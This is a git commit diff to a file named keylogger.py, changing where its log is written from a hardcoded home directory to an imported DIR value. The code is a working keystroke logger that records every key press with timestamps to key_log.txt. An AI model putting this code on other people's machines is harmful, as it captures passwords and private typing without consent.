72b2749de18e38975bf09d974da83c364f3657de
iker sanchez <iker@dominicos.org>
2022-12-29 15:01:51 +0100

    gitignore added

--- keylogger.py
+++ keylogger.py
@@ -1,10 +1,11 @@
 import logging
 from pynput import keyboard
+from DIR import DIR
 
 def on_press(key):  logging.info(key)
 
 def start_logging():
-    log_dir = '/home/iker/'
+    log_dir = DIR
     logging.basicConfig(filename=(log_dir + 'key_log.txt'), level=logging.INFO, format='%(asctime)s: %(message)s')
     with keyboard.Listener(on_press=on_press) as listener: listener.join()
 
